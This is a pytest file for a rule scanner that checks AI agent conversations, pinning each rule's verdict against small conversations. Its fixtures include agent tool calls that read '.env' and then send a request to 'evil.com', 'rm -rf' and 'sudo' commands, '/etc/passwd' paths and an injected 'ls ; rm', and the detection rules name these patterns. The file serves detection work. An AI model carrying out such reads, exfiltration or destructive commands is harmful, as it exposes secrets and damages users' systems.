# Copyright 2026 Cisco Systems, Inc. and its affilitates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Rule verdicts on hand-written conversations, through the scanner.

The property tests (``test_semantic_properties.py``) cover the generated language; these rows
pin constructs the generators do not draw (string modifiers on declared strings, match
positions, indexed fields, sequences, static surfaces, model classifiers) and reproduced bugs
whose scenario the generators would reach only by chance. Each row is one rule, one
conversation and the verdict it must give.
"""

from __future__ import annotations

import base64
import json
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace

import pytest
from hypothesis import given
from hypothesis import strategies as st

from quarry.config import QuarryConfig
from quarry.integrations.model_inference import ModelInferenceBackend
from quarry.scanner import DSLScanner
from tests.conftest import rule_matches


def _rule(condition: str, *strings: str) -> str:
    block = "strings:\n" + "".join(f"    {s}\n" for s in strings) if strings else ""
    return f'rule "R"\n{block}condition:\n    {condition}\n'


def _user(content: str) -> dict:
    return {"role": "user", "content": content}


def _assistant(content: str) -> dict:
    return {"role": "assistant", "content": content}


def _system(content: str) -> dict:
    return {"role": "system", "content": content}


def _call(name: str, call_id: str = "c1", **arguments) -> dict:
    return {
        "role": "assistant",
        "content": "",
        "tool_calls": [
            {
                "id": call_id,
                "type": "function",
                "function": {"name": name, "arguments": json.dumps(arguments)},
            }
        ],
    }


def _response(call_id: str, content: str) -> dict:
    return {"role": "tool", "tool_call_id": call_id, "content": content}


def _tool(name: str, description: str = "", **properties) -> dict:
    parameters = {"type": "object", "properties": properties} if properties else {}
    return {
        "type": "function",
        "function": {"name": name, "description": description, "parameters": parameters},
    }


def _conv(*messages: dict, tools: tuple[dict, ...] = ()) -> dict:
    return {"messages": list(messages), "tools": list(tools)}


_SUDO = 'any call in get_tool_calls("execute_shell") where call.arguments.command contains_any ["sudo", "su "]'
_READ_THEN_SEND = 'called_tool("http_post") after(within: 2) called_tool("read_file")'
_LEAK = (
    'any m in user_messages where ("TOKEN" in m.content as tok) '
    "and any r in tool_responses where r.content contains tok"
)
_ECHOED_INJECTION = (
    'called_tool("execute_shell") and any c in get_tool_calls("execute_shell") where '
    'any m in user_messages where m.content contains_any [";", "&&"] and '
    "c.arguments.command contains m.content"
)
_TWO_FLOWS = (
    '(called_tool("a") after(within: 20) m.content contains "x") and '
    '(called_tool("b") after(within: 20) m.content contains "x")'
)
_FLOWS_AT_ROOT = " and ".join(
    f'(called_tool("b{i}") after(within: 10) called_tool("a{i}"))' for i in range(3)
)
_SEVEN_PARTS = "any m in user_messages where " + " and ".join(
    f'(m.content contains "x{i}" or called_tool("t{i}"))' for i in range(7)
)
_A = 't.description contains "A"'
_WILDCARD = ('$a1 = "FOO"', '$a2 = "BAR"')
_LOGIN_BEFORE_PASSWORD = ('$u1 = "user"', '$u2 = "login"', '$p1 = "pass"', '$p2 = "pwd"')
_HELLO = _user("hello")
_HIT = [_user("x"), _call("a", "c1"), _call("b", "c2")]


_VERDICTS = [
    # ── string matching on message and argument fields ──────────────────
    pytest.param(
        _rule(_SUDO), _conv(_call("execute_shell", command="sudo rm")), True, id="contains-any-hit"
    ),
    pytest.param(
        _rule(_SUDO), _conv(_call("execute_shell", command="ls -la")), False, id="contains-any-miss"
    ),
    pytest.param(
        _rule(_SUDO),
        _conv(_call("execute_shell", cwd="/tmp")),
        False,
        id="contains-any-missing-field",
    ),
    pytest.param(
        _rule(r'any m in user_messages where m.content ~ "\d{3}-\d{2}-\d{4}"'),
        _conv(_user("my ssn is 123-45-6789")),
        True,
        id="regex-hit",
    ),
    pytest.param(
        _rule(r'any m in user_messages where m.content ~ "\d{3}-\d{2}-\d{4}"'),
        _conv(_user("my ssn is 12-345-6789")),
        False,
        id="regex-miss",
    ),
    pytest.param(
        _rule("any m in user_messages where m.content contains $kw", '$kw = "SECRET" nocase'),
        _conv(_user("this is a secret value")),
        True,
        id="nocase-lowercase-hit",
    ),
    pytest.param(
        _rule("any m in user_messages where m.content contains $kw", '$kw = "SECRET" nocase'),
        _conv(_user("nothing sensitive")),
        False,
        id="nocase-miss",
    ),
    pytest.param(
        _rule("any m in user_messages where m.content contains $w", '$w = "cat" fullword'),
        _conv(_user("the cat sat")),
        True,
        id="fullword-whole-word",
    ),
    pytest.param(
        _rule("any m in user_messages where m.content contains $w", '$w = "cat" fullword'),
        _conv(_user("concatenate the list")),
        False,
        id="fullword-inside-a-word",
    ),
    pytest.param(
        _rule("any m in user_messages where m.content contains $s", '$s = "secret" base64'),
        _conv(_user(f"payload {base64.b64encode(b'secret').decode()} end")),
        True,
        id="base64-encoded-hit",
    ),
    pytest.param(
        _rule("any m in user_messages where m.content contains $s", '$s = "secret" base64'),
        _conv(_user("payload secret end")),
        False,
        id="base64-plain-text-miss",
    ),
    pytest.param(
        _rule('user_said("urgent")'),
        _conv(_user("URGENT: everything is down")),
        True,
        id="user-said-ignores-case",
    ),
    pytest.param(
        _rule('any c in tool_calls where c.name in ["exec", "eval", "run"]'),
        _conv(_call("eval")),
        True,
        id="name-in-list-hit",
    ),
    pytest.param(
        _rule('any c in tool_calls where c.name in ["exec", "eval", "run"]'),
        _conv(_call("read")),
        False,
        id="name-in-list-miss",
    ),
    # ── string sets, counts and lengths ─────────────────────────────────
    pytest.param(
        _rule(
            "any m in user_messages where 2 of ($a, $b, $c)",
            '$a = "alpha"',
            '$b = "bravo"',
            '$c = "charlie"',
        ),
        _conv(_user("alpha and bravo present")),
        True,
        id="two-of-three-at-bound",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where 2 of ($a, $b, $c)",
            '$a = "alpha"',
            '$b = "bravo"',
            '$c = "charlie"',
        ),
        _conv(_user("only alpha present")),
        False,
        id="two-of-three-below-bound",
    ),
    pytest.param(
        _rule("any m in user_messages where #u in m.content >= 3", '$u = "http"'),
        _conv(_user("http http http")),
        True,
        id="occurrence-count-at-threshold",
    ),
    pytest.param(
        _rule("any m in user_messages where #u in m.content >= 3", '$u = "http"'),
        _conv(_user("http http")),
        False,
        id="occurrence-count-below-threshold",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where #d in m.content >= 100000000000000000000",
            '$d = "x" regex',
        ),
        _conv(_user("xxx")),
        False,
        id="count-bound-beyond-int64-at-least",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where #d in m.content < 100000000000000000000", '$d = "x" regex'
        ),
        _conv(_user("xxx")),
        True,
        id="count-bound-beyond-int64-below",
    ),
    pytest.param(
        _rule("any m in user_messages where len(m.content) > 10"),
        _conv(_user("this is definitely long enough")),
        True,
        id="length-above-gate",
    ),
    pytest.param(
        _rule("any m in user_messages where len(m.content) > 10"),
        _conv(_user("0123456789")),
        False,
        id="length-at-strict-gate",
    ),
    pytest.param(
        _rule("any m in user_messages where count(m.content) >= 2"),
        _conv(_user("ab")),
        True,
        id="one-argument-count-is-length",
    ),
    pytest.param(
        _rule("any m in user_messages where count(m.content) >= 2"),
        _conv(_user("a")),
        False,
        id="one-argument-count-below",
    ),
    pytest.param(
        _rule('any m in user_messages where count(m.content, "a") + count(m.content, "b") > 3'),
        _conv(_user("aabb")),
        True,
        id="same-field-count-sum-above",
    ),
    pytest.param(
        _rule('any m in user_messages where count(m.content, "a") + count(m.content, "b") > 3'),
        _conv(_user("aab")),
        False,
        id="same-field-count-sum-at",
    ),
    pytest.param(
        _rule('any m in user_messages where 3 < count(m.content, "a") + count(m.content, "b")'),
        _conv(_user("aabb")),
        True,
        id="count-sum-with-literal-on-the-left",
    ),
    pytest.param(
        _rule('any m in user_messages where 3 < count(m.content, "a") + count(m.content, "b")'),
        _conv(_user("ab")),
        False,
        id="count-sum-with-literal-on-the-left-miss",
    ),
    pytest.param(
        _rule('any m in user_messages where count(m.content, "a") + count(m.content, "a") > 3'),
        _conv(_user("aa")),
        True,
        id="repeated-count-term-counts-twice",
    ),
    pytest.param(
        _rule('any m in user_messages where count(m.content, "a") + count(m.content, "a") > 3'),
        _conv(_user("a")),
        False,
        id="repeated-count-term-below",
    ),
    pytest.param(
        _rule("count(user_messages) >= 3"),
        _conv(*(_user(f"m{i}") for i in range(2))),
        False,
        id="surface-count-below",
    ),
    pytest.param(
        _rule("count(user_messages) >= 3"),
        _conv(*(_user(f"m{i}") for i in range(5))),
        True,
        id="surface-count-above",
    ),
    pytest.param(
        _rule("len(messages) > 5000"),
        _conv(_user("hi")),
        False,
        id="surface-count-with-a-large-bound",
    ),
    pytest.param(
        _rule("count(tool_calls) == 2"),
        _conv(_call("a", "c1"), _call("b", "c2")),
        True,
        id="surface-count-equals",
    ),
    pytest.param(
        _rule("count(tool_calls) < 2"),
        _conv(_call("a", "c1"), _call("b", "c2")),
        False,
        id="surface-count-less-than",
    ),
    pytest.param(
        _rule('count([m for m in user_messages if m.content ~ "sudo"]) >= 40'),
        _conv(*(_user(f"sudo {i}") for i in range(40)), *(_user("hello") for _ in range(3))),
        True,
        id="filter-count-of-forty-at-bound",
    ),
    pytest.param(
        _rule('count([m for m in user_messages if m.content ~ "sudo"]) >= 40'),
        _conv(*(_user(f"sudo {i}") for i in range(39))),
        False,
        id="filter-count-of-forty-below-bound",
    ),
    pytest.param(
        _rule(
            'count([tc for tc in get_tool_calls("execute_shell") if tc.arguments.command ~ "rm"]) >= 2'
        ),
        _conv(
            _call("execute_shell", "c1", command="rm -rf a"),
            _call("execute_shell", "c2", command="rm -rf b"),
        ),
        True,
        id="filter-count-over-an-accessor",
    ),
    pytest.param(
        _rule(
            'count([tc for tc in get_tool_calls("execute_shell") if tc.arguments.command ~ "rm"]) >= 2'
        ),
        _conv(
            _call("execute_shell", "c1", command="rm -rf a"),
            _call("read_file", "c2", command="rm -rf b"),
        ),
        False,
        id="filter-count-accessor-narrows-by-name",
    ),
    # ── match positions ─────────────────────────────────────────────────
    pytest.param(
        _rule("any m in user_messages where @a in m.content < 5", '$a = "secret"'),
        _conv(_user("secret here")),
        True,
        id="position-before-offset",
    ),
    pytest.param(
        _rule("any m in user_messages where @a in m.content < 5", '$a = "secret"'),
        _conv(_user("aaaaaaaasecret")),
        False,
        id="position-after-offset",
    ),
    pytest.param(
        _rule("any m in user_messages where @a* in m.content < 10", *_WILDCARD),
        _conv(_user("xxxxxxxBAR")),
        True,
        id="wildcard-position-second-pattern",
    ),
    pytest.param(
        _rule("any m in user_messages where @a* in m.content < 10", *_WILDCARD),
        _conv(_user("xxxxxxxxxxBAR here FOO")),
        False,
        id="wildcard-position-earliest-too-late",
    ),
    pytest.param(
        _rule("any m in user_messages where @a* in m.content < 10", *_WILDCARD),
        _conv(_user("nothing relevant")),
        False,
        id="wildcard-position-no-match",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where (@u* in m.content) < (@p* in m.content)",
            *_LOGIN_BEFORE_PASSWORD,
        ),
        _conv(_user("login then pwd here")),
        True,
        id="wildcard-positions-in-order",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where (@u* in m.content) < (@p* in m.content)",
            *_LOGIN_BEFORE_PASSWORD,
        ),
        _conv(_user("pass first then user")),
        False,
        id="wildcard-positions-reversed",
    ),
    pytest.param(
        _rule(
            "any m in user_messages where (@u* in m.content) < (@p* in m.content)",
            *_LOGIN_BEFORE_PASSWORD,
        ),
        _conv(_user("only user here")),
        False,
        id="wildcard-positions-one-missing",
    ),
    pytest.param(
        _rule(
            "any c in tool_calls where (@a in c.name) < (@b in c.arguments)", '$a = "x"', '$b = "y"'
        ),
        _conv(_call("aax", k="y")),
        True,
        id="cross-field-positions-in-order",
    ),
    pytest.param(
        _rule(
            "any c in tool_calls where (@a in c.name) < (@b in c.arguments)", '$a = "x"', '$b = "y"'
        ),
        _conv(_call("xtool", k="noo")),
        False,
        id="cross-field-position-missing",
    ),
    pytest.param(
        _rule(
            "any c in tool_calls where ((@b in c.arguments) - (@a in c.name)) < 5",
            '$a = "x"',
            '$b = "y"',
        ),
        _conv(_call("aaaaax", k="y")),
        True,
        id="cross-field-position-difference-hit",
    ),
    pytest.param(
        _rule(
            "any c in tool_calls where ((@b in c.arguments) - (@a in c.name)) < 5",
            '$a = "x"',
            '$b = "y"',
        ),
        _conv(_call("x", k="y")),
        False,
        id="cross-field-position-difference-miss",
    ),
    pytest.param(
        _rule('count(system_prompt, "x") > 2'),
        _conv(_system("x x x"), _user("hi")),
        True,
        id="system-prompt-count-above",
    ),
    pytest.param(
        _rule('count(system_prompt, "x") > 2'),
        _conv(_system("x"), _user("hi")),
        False,
        id="system-prompt-count-below",
    ),
    pytest.param(
        _rule("#a in system_prompt > 2", '$a = "x"'),
        _conv(_system("x x x"), _user("hi")),
        True,
        id="system-prompt-occurrences-above",
    ),
    pytest.param(
        _rule("@a in system_prompt > 5", '$a = "x"'),
        _conv(_system("123456x"), _user("hi")),
        True,
        id="system-prompt-position-late",
    ),
    pytest.param(
        _rule("@a in system_prompt > 5", '$a = "x"'),
        _conv(_system("x12345"), _user("hi")),
        False,
        id="system-prompt-position-early",
    ),
    pytest.param(
        _rule("2 of ($a, $b) in system_prompt", '$a = "foo"', '$b = "bar"'),
        _conv(_system("foo and bar"), _user("hi")),
        True,
        id="system-prompt-two-of-two",
    ),
    pytest.param(
        _rule("2 of ($a, $b) in system_prompt", '$a = "foo"', '$b = "bar"'),
        _conv(_system("foo and baz"), _user("hi")),
        False,
        id="system-prompt-one-of-two",
    ),
    pytest.param(
        _rule("len(system_prompt) > 3"),
        _conv(_system("hello"), _user("hi")),
        True,
        id="system-prompt-length-above",
    ),
    pytest.param(
        _rule("len(system_prompt) > 10"),
        _conv(_system("hello"), _user("hi")),
        False,
        id="system-prompt-length-below",
    ),
    # ── indexed fields and tool-call names ──────────────────────────────
    pytest.param(
        _rule('any c in tool_calls where c.arguments.paths[0] contains "/etc"'),
        _conv(_call("x", paths=["/etc/passwd", "/tmp"])),
        True,
        id="index-zero-first-element",
    ),
    pytest.param(
        _rule('any c in tool_calls where c.arguments.paths[0] contains "/etc"'),
        _conv(_call("x", paths=["/tmp", "/etc/x"])),
        False,
        id="index-zero-ignores-later-elements",
    ),
    pytest.param(
        _rule('any c in tool_calls where c.arguments.paths[0] contains "/etc"'),
        _conv(_call("x", paths=[])),
        False,
        id="index-into-an-empty-list",
    ),
    pytest.param(
        _rule('any c in tool_calls where c.arguments.paths[2] contains "third"'),
        _conv(_call("x", paths=["a", "b", "third one"])),
        True,
        id="index-two-third-element",
    ),
    pytest.param(
        _rule('any c in tool_calls where c.arguments.paths[2] contains "third"'),
        _conv(_call("x", paths=["third", "b", "c"])),
        False,
        id="index-two-ignores-first-element",
    ),
    pytest.param(
        _rule('any x in call_sequence() where x == "read_file"'),
        _conv(_call("list_dir", "c1"), _call("read_file", "c2")),
        True,
        id="call-sequence-name-present",
    ),
    pytest.param(
        _rule('any x in call_sequence() where x == "read_file"'),
        _conv(_call("send", "c1"), _call("list_dir", "c2")),
        False,
        id="call-sequence-name-absent",
    ),
    pytest.param(
        _rule('any x in call_sequence() where x contains "read"'),
        _conv(_call("writer")),
        False,
        id="call-sequence-substring-absent",
    ),
    pytest.param(
        _rule('has_sequence("a", "b", "c")'),
        _conv(_call("z", "c0"), _call("a", "c1"), _call("b", "c2"), _call("c", "c3")),
        True,
        id="sequence-after-leading-call",
    ),
    pytest.param(
        _rule('has_sequence("a", "b", "c")'),
        _conv(_call("a", "c1"), _call("b", "c2"), _call("x", "c3"), _call("c", "c4")),
        False,
        id="sequence-broken-by-another-call",
    ),
    pytest.param(
        _rule('has_sequence("a", "b")'),
        _conv(_call("a", "c1"), _user("hi"), _call("b", "c2")),
        True,
        id="sequence-with-a-message-between",
    ),
    pytest.param(_rule('has_sequence("only")'), _conv(_call("only")), True, id="sequence-of-one"),
    # ── flows ───────────────────────────────────────────────────────────
    pytest.param(
        _rule(_READ_THEN_SEND),
        _conv(_call("read_file", "c1"), _call("http_post", "c2")),
        True,
        id="flow-within-window",
    ),
    pytest.param(
        _rule(_READ_THEN_SEND),
        _conv(
            _call("read_file", "c1"),
            _user("filler"),
            _assistant("filler"),
            _call("http_post", "c2"),
        ),
        False,
        id="flow-outside-window",
    ),
    pytest.param(
        _rule(_READ_THEN_SEND),
        _conv(_call("http_post", "c1"), _call("read_file", "c2")),
        False,
        id="flow-wrong-order",
    ),
    pytest.param(
        _rule('called_tool("exfil") after(within: 5) called_tools("read", "collect")'),
        _conv(_call("read", "1"), _call("collect", "2"), _call("exfil", "3")),
        True,
        id="flow-after-every-named-call",
    ),
    pytest.param(
        _rule('called_tool("exfil") after(within: 5) called_tools("read", "collect")'),
        _conv(_call("read", "1"), _call("exfil", "2")),
        False,
        id="flow-after-only-one-named-call",
    ),
    pytest.param(
        _rule(
            'any resp in tool_responses where resp.content contains "Permission denied" right_after called_tool("execute_command")'
        ),
        _conv(
            _system("sys"),
            _user("run it"),
            _call("execute_command"),
            _response("c1", "bash: Permission denied"),
        ),
        True,
        id="response-right-after-its-call-after-a-system-message",
    ),
    pytest.param(
        _rule(
            'any r1 in tool_responses where r1.content contains "BBB" after(within: 3) any r2 in tool_responses where r2.content contains "AAA"'
        ),
        _conv(_call("t", "c1"), _response("c1", "AAA and BBB together")),
        False,
        id="one-response-is-not-both-flow-sides",
    ),
    pytest.param(
        _rule(
            'any r1 in tool_responses where r1.content contains "BBB" after(within: 3) any r2 in tool_responses where r2.content contains "AAA"'
        ),
        _conv(_call("t", "c1"), _response("c1", "AAA"), _call("t", "c2"), _response("c2", "BBB")),
        True,
        id="two-responses-are-both-flow-sides",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where (m.content contains "urgent" and (called_tool("send") after called_tool("read")))'
        ),
        _conv(_user("this is urgent"), _call("read", "c1"), _call("send", "c2")),
        True,
        id="flow-beside-an-element-test",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where (m.content contains "urgent" and (called_tool("send") after called_tool("read")))'
        ),
        _conv(_user("calm"), _call("read", "c1"), _call("send", "c2")),
        False,
        id="flow-beside-a-failing-element-test",
    ),
    pytest.param(
        _rule(
            'any h in get_tool_calls("http_request") where h.arguments.url contains "evil" after any r in get_tool_calls("read_file") where r.arguments.path contains ".env"'
        ),
        _conv(_call("read_file", "c1", path=".env"), _call("http_request", "c2", url="evil.com")),
        True,
        id="flow-between-accessors",
    ),
    pytest.param(
        _rule(
            'any h in get_tool_calls("http_request") where h.arguments.url contains "evil" after any r in get_tool_calls("read_file") where r.arguments.path contains ".env"'
        ),
        _conv(_call("read_file", "c1", path=".env"), _call("fetch", "c2", url="evil.com")),
        False,
        id="flow-keeps-the-accessor-name-filter",
    ),
    pytest.param(
        _rule('has_tool("t") and (called_tool("b") after(within: 2) called_tool("a"))'),
        _conv(_call("a", "c1"), _call("b", "c2"), tools=(_tool("t"),)),
        True,
        id="static-test-beside-a-flow-in-its-window",
    ),
    pytest.param(
        _rule('has_tool("t") and (called_tool("b") after(within: 2) called_tool("a"))'),
        _conv(_call("a", "c1"), _user("filler"), _call("b", "c2"), tools=(_tool("t"),)),
        False,
        id="static-test-does-not-widen-the-flow-window",
    ),
    pytest.param(
        _rule('(called_tool("read") until called_tool("send"))'),
        _conv(_call("read", "c1"), _user("thanks"), _call("send", "c2")),
        True,
        id="until-sustained-across-other-events",
    ),
    pytest.param(
        _rule('(called_tool("read") until called_tool("send"))'),
        _conv(_call("read", "c1"), _call("other", "c2"), _call("send", "c3")),
        False,
        id="until-broken-by-another-call",
    ),
    pytest.param(
        _rule(_FLOWS_AT_ROOT),
        _conv(*(m for i in range(3) for m in (_call(f"a{i}", f"a{i}"), _call(f"b{i}", f"b{i}")))),
        True,
        id="independent-flows-each-in-order",
    ),
    pytest.param(
        _rule(_FLOWS_AT_ROOT),
        _conv(
            _call("b0", "b0"),
            _call("a0", "a0"),
            *(m for i in (1, 2) for m in (_call(f"a{i}", f"a{i}"), _call(f"b{i}", f"b{i}"))),
        ),
        False,
        id="independent-flows-one-reversed",
    ),
    pytest.param(
        _rule(_FLOWS_AT_ROOT),
        _conv(
            _call("a0", "a0"),
            *(_user("filler") for _ in range(10)),
            _call("b0", "b0"),
            *(m for i in (1, 2) for m in (_call(f"a{i}", f"a{i}"), _call(f"b{i}", f"b{i}"))),
        ),
        False,
        id="independent-flows-one-too-far-apart",
    ),
    pytest.param(
        _rule(f"any m in user_messages where {_TWO_FLOWS}"),
        _conv(*[_HELLO] * 300, *_HIT),
        True,
        id="element-in-two-flows-after-many-candidates",
    ),
    pytest.param(
        _rule(f"any m in user_messages where {_TWO_FLOWS}"),
        _conv(*[_HELLO] * 257),
        False,
        id="element-in-two-flows-no-candidate",
    ),
    pytest.param(
        _rule(f"any m in user_messages where {_TWO_FLOWS}"),
        _conv(_user("x"), *[_user("filler")] * 20, _call("a", "c1"), _call("b", "c2")),
        False,
        id="element-in-two-flows-too-far",
    ),
    pytest.param(
        _rule(f'called_tool("z") or (any m in user_messages where {_TWO_FLOWS})'),
        _conv(*[_HELLO] * 300, _call("z", "c0")),
        True,
        id="ruled-out-elements-leave-the-other-side",
    ),
    pytest.param(
        _rule(f'called_tool("z") or (any m in user_messages where {_TWO_FLOWS})'),
        _conv(*[_HELLO] * 300),
        False,
        id="ruled-out-elements-and-no-other-side",
    ),
    pytest.param(
        _rule(_SEVEN_PARTS),
        _conv(_user("x0 x1 x2"), *(_call(f"t{i}", f"t{i}") for i in range(3, 7))),
        True,
        id="seven-parts-mixing-element-and-calls",
    ),
    pytest.param(
        _rule(_SEVEN_PARTS),
        _conv(_user("x0 x1 x2"), _user("x3 x4 x5 x6")),
        False,
        id="seven-parts-split-across-elements",
    ),
    # ── comprehensions ──────────────────────────────────────────────────
    pytest.param(
        _rule('all m in user_messages where m.content contains "safe_"'),
        _conv(_user("safe_a"), _assistant("whatever"), _user("safe_b")),
        True,
        id="all-skips-other-surfaces",
    ),
    pytest.param(
        _rule('all m in user_messages where m.content contains "safe_"'),
        _conv(_user("safe_a"), _assistant("whatever"), _user("danger")),
        False,
        id="all-with-one-failing-element",
    ),
    pytest.param(
        _rule('all m in user_messages where m.content contains "safe_"'),
        _conv(_assistant("x")),
        True,
        id="all-over-an-empty-surface",
    ),
    # A conversation of only a system prompt has no timeline events: the empty word.
    pytest.param(
        _rule('all m in user_messages where m.content contains "a"'),
        _conv(_system("you are a bot")),
        True,
        id="all-on-an-empty-timeline",
    ),
    pytest.param(
        _rule('any m in user_messages where m.content contains "a"'),
        _conv(_system("you are a bot")),
        False,
        id="any-on-an-empty-timeline",
    ),
    pytest.param(
        _rule('has_tool("q") and all m in user_messages where m.content contains "a"'),
        _conv(_system("you are a bot"), tools=(_tool("q"),)),
        True,
        id="static-test-and-all-on-an-empty-timeline",
    ),
    pytest.param(
        _rule('has_tool("z") and all m in user_messages where m.content contains "a"'),
        _conv(_system("you are a bot"), tools=(_tool("q"),)),
        False,
        id="failing-static-test-and-all-on-an-empty-timeline",
    ),
    pytest.param(
        _rule('any m in user_messages where ("x" in m.content as v) and v == "x"'),
        _conv(_system("you are a bot")),
        False,
        id="value-tested-capture-on-an-empty-timeline",
    ),
    pytest.param(
        _rule("false"),
        _conv(_system("you are a bot")),
        False,
        id="false-on-an-empty-timeline",
    ),
    pytest.param(
        _rule('count([m for m in user_messages if m.content contains "a"]) == 2'),
        _conv(_user("a"), _user("b"), _user("a")),
        True,
        id="filter-count-equals",
    ),
    pytest.param(
        _rule('any r in tool_responses where called_tool("send")'),
        _conv(_call("send")),
        False,
        id="any-needs-an-element-for-a-conversation-wide-body",
    ),
    pytest.param(
        _rule('any r in tool_responses where called_tool("send")'),
        _conv(_call("send"), _response("c1", "done")),
        True,
        id="any-with-an-element-and-a-conversation-wide-body",
    ),
    pytest.param(
        _rule('len(get_tool_responses("read_file")) > 1'),
        _conv(
            _call("read_file", "c1"),
            _response("c1", "secret"),
            _call("send_email", "c2"),
            _response("c2", "sent"),
        ),
        False,
        id="response-accessor-counts-only-its-tool",
    ),
    pytest.param(
        _rule('len(get_tool_responses("read_file")) >= 1'),
        _conv(
            _call("read_file", "c1"),
            _response("c1", "secret"),
            _call("send_email", "c2"),
            _response("c2", "sent"),
        ),
        True,
        id="response-accessor-finds-its-tool",
    ),
    # ── captured values ─────────────────────────────────────────────────
    pytest.param(
        _rule(_LEAK),
        _conv(_user("my TOKEN is here"), _call("x"), _response("c1", "echoing TOKEN back")),
        True,
        id="capture-echoed-back",
    ),
    pytest.param(
        _rule(_LEAK),
        _conv(_user("my TOKEN is here"), _call("x"), _response("c1", "nothing sensitive")),
        False,
        id="capture-not-echoed",
    ),
    pytest.param(
        _rule(_LEAK),
        _conv(_user("hello"), _call("x"), _response("c1", "TOKEN here")),
        False,
        id="capture-never-bound",
    ),
    pytest.param(
        _rule(_LEAK + " and any c in tool_calls where c.arguments.command contains tok"),
        _conv(
            _user("my TOKEN here"),
            _call("x", command="run TOKEN now"),
            _response("c1", "saw TOKEN"),
        ),
        True,
        id="capture-at-every-reference-site",
    ),
    pytest.param(
        _rule(_LEAK + " and any c in tool_calls where c.arguments.command contains tok"),
        _conv(
            _user("my TOKEN here"), _call("x", command="run nothing"), _response("c1", "saw TOKEN")
        ),
        False,
        id="capture-missing-at-one-reference-site",
    ),
    pytest.param(
        _rule(_ECHOED_INJECTION),
        _conv(
            _user("ls ; rm"),
            _call("execute_shell", command="ls ; rm"),
            tools=(_tool("execute_shell"),),
        ),
        True,
        id="nested-join-echoed-into-a-command",
    ),
    pytest.param(
        _rule(_ECHOED_INJECTION),
        _conv(
            _user("ls ; rm"),
            _call("execute_shell", command="echo hi"),
            tools=(_tool("execute_shell"),),
        ),
        False,
        id="nested-join-not-echoed",
    ),
    pytest.param(
        _rule(_ECHOED_INJECTION),
        _conv(
            _user("hello"), _call("execute_shell", command="safe"), tools=(_tool("execute_shell"),)
        ),
        False,
        id="nested-join-no-injection",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where ("zz" in m.content as v) and any t in tools where t.description contains v'
        ),
        _conv(_user("zz"), tools=(_tool("baz", "run zz"),)),
        True,
        id="message-value-found-in-a-tool",
    ),
    pytest.param(
        _rule(
            'any m in user_messages where ("zz" in m.content as v) and any t in tools where t.description contains v'
        ),
        _conv(_user("yy"), tools=(_tool("baz", "run zz"),)),
        False,
        id="message-value-absent-from-messages",
    ),
    pytest.param(
        _rule(
            'any a in user_messages where (("TOKEN" in a.content as tok) or a.content contains "Z") and not (any r in tool_responses where r.content contains tok)'
        ),
        _conv(_user("Z"), _call("x"), _response("c1", "TOKEN")),
        True,
        id="element-without-a-value-and-negated-reference",
    ),
    pytest.param(
        _rule(
            'any a in user_messages where (("TOKEN" in a.content as tok) or a.content contains "Z") and not (any r in tool_responses where r.content contains tok)'
        ),
        _conv(_user("TOKEN"), _user("Z"), _call("x"), _response("c1", "TOKEN")),
        True,
        id="unrelated-value-does-not-change-an-element",
    ),
    pytest.param(
        _rule(
            'any a in user_messages where (("TOKEN" in a.content as tok) or a.content contains "Z") and not (any r in tool_responses where r.content contains tok)'
        ),
        _conv(_user("TOKEN"), _call("x"), _response("c1", "TOKEN")),
        False,
        id="value-found-under-negation",
    ),
    pytest.param(
        _rule(
            'any k in tool_calls where k.name == "x" and ($a in k.arguments.cmd as v) and any r in tool_responses where r.content contains v',
            '$a = "a" fullword',
        ),
        _conv(_call("y", "c1", cmd="a"), _response("c1", "a"), _call("x", "c2", cmd="ab")),
        False,
        id="captured-value-honors-fullword",
    ),
    pytest.param(
        _rule(
            'any k in tool_calls where k.name == "x" and ($a in k.arguments.cmd as v) and any r in tool_responses where r.content contains v',
            '$a = "a" fullword',
        ),
        _conv(_call("y", "c1", cmd="a"), _response("c1", "a"), _call("x", "c2", cmd="a b")),
        True,
        id="captured-value-binds-the-whole-word",
    ),
    # ── tool definitions ────────────────────────────────────────────────
    pytest.param(
        _rule('has_tool("x")'), _conv(_user("a"), tools=(_tool("x"),)), True, id="has-tool-present"
    ),
    pytest.param(
        _rule('not has_tool("x")'),
        _conv(_user("a"), tools=(_tool("x"),)),
        False,
        id="not-has-tool-present",
    ),
    pytest.param(
        _rule('has_tool("x") and user_said("a")'),
        _conv(_user("a")),
        False,
        id="has-tool-absent-beside-a-message-test",
    ),
    pytest.param(
        _rule("len(tools) > 1"),
        _conv(_user("hi"), tools=(_tool("a"), _tool("b"))),
        True,
        id="tool-count-above",
    ),
    pytest.param(
        _rule("len(tools) > 5"),
        _conv(_user("hi"), tools=(_tool("a"), _tool("b"))),
        False,
        id="tool-count-below",
    ),
    pytest.param(
        _rule("any t in tools where t.parameters.properties.hidden != null"),
        _conv(_user("hi"), tools=(_tool("a", hidden={"type": "string"}),)),
        True,
        id="tool-property-present",
    ),
    pytest.param(
        _rule("any t in tools where t.parameters.properties.hidden != null"),
        _conv(_user("hi"), tools=(_tool("a", shown={"type": "string"}),)),
        False,
        id="tool-property-absent",
    ),
    pytest.param(
        _rule(f"all t in tools where {_A}"),
        _conv(_user("hello")),
        True,
        id="all-tools-with-no-tools",
    ),
    pytest.param(
        _rule(f"all t in tools where {_A}"),
        _conv(_user("hello"), tools=(_tool("t0", "A"), _tool("t1", "B"))),
        False,
        id="all-tools-one-fails",
    ),
    pytest.param(
        _rule(f"all t in tools where {_A}"),
        _conv(_user("hello"), tools=(_tool("t0", "A"), _tool("t1", "AA"))),
        True,
        id="all-tools-every-tool-passes",
    ),
    pytest.param(
        _rule(f"not (all t in tools where {_A})"),
        _conv(_user("hello"), tools=(_tool("t0", "A"), _tool("t1", "B"))),
        True,
        id="not-all-tools",
    ),
